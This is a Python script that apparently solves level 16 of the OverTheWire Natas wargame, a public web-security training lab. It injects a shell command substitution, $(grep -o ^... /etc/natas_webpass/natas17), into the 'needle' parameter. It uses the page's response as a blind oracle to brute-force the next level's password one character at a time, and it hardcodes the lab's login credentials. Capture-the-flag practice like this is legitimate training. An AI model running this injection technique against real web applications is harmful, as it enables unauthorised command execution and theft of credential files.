#!/usr/bin/python3

import requests
from string import ascii_letters, digits

BASE_URL = "http://natas16.natas.labs.overthewire.org"
WORD_IN_DICTIONARY = "Jewish"
FILE_PATH = "/etc/natas_webpass/natas17"
AUTHENTICATION = {'username': 'natas16',
                  'password': 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'}


def create_url_query(first_characters_in_password: str) -> str:
    """
    Creates an url query with username and password.
    """
    # Jewish + /etc/natas_webpass/natas17's text if it starts with first_characters_in_password
    query = "/?needle={}$(grep -o ^{} {})".format(WORD_IN_DICTIONARY,
                                                  first_characters_in_password, FILE_PATH)
    return query


def is_valid_url(url: str) -> bool:
    """
    Check if the given url returns the expected output.
    """
    session = requests.Session()
    session.auth = (AUTHENTICATION['username'], AUTHENTICATION['password'])
    response = session.get(url=url)
    data = response.text
    return WORD_IN_DICTIONARY not in data


def run_brute_force() -> str:
    """
    Starts brute force and return result.
    """
    characters_in_password = []
    possible_characters = ascii_letters + digits

    while True:
        found_valid_letter = False

        # go through all ascii letters (a-z A-Z) and numbers (0-9)
        for c in possible_characters:
            query = create_url_query(''.join(characters_in_password) + c)
            if is_valid_url(BASE_URL + query):
                characters_in_password.append(c)
                found_valid_letter = True
                break

        # If there is no valid letter found - break
        if not found_valid_letter:
            break

    return ''.join(characters_in_password)


def main():
    print("Starting brute force...")
    password = run_brute_force()
    print("Brute force result:", password)


if __name__ == "__main__":
    main()
